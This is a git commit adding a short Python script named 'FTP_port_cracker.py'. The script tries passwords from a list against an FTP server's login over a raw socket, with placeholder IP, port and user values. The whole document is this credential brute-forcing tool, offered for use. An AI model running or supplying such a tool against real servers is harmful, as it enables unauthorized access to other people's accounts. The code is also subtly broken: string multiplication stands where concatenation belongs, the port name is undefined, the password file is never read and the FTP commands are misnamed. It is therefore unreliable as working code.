95fdcdf8dbfba8432ca4ff13bc598d5bbb102e7b
IvanHanonoCozzetti <64793737+IvanHanonoCozzetti@users.noreply.github.com>
2020-12-12 00:20:16 +0200

    Add files via upload

---
+++ FTP_port_cracker.py
@@ -0,0 +1,31 @@
+import socket
+import re
+import sys
+
+def connection(ip, user, passw):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print('Trying' + ip + ':' + user + ':' + passw)
+
+	sock.connect(('ip_number_here', port_number_here))
+
+	data = sock.recv(1024)
+
+	sock.send('User' + user * '\r\n')
+
+	data = sock.recv(1024)
+
+	sock.send('Password' + passw * '\r\n')
+
+	data = sock.recv(1024)
+
+	sock.send('Quit' * '\r\n')
+
+	sock.close()
+
+	return data
+
+user = 'User/s here'
+password = ['passowrd_list_here.txt']
+
+for password in password:
+	print(connection('ip_number_here', user, password))
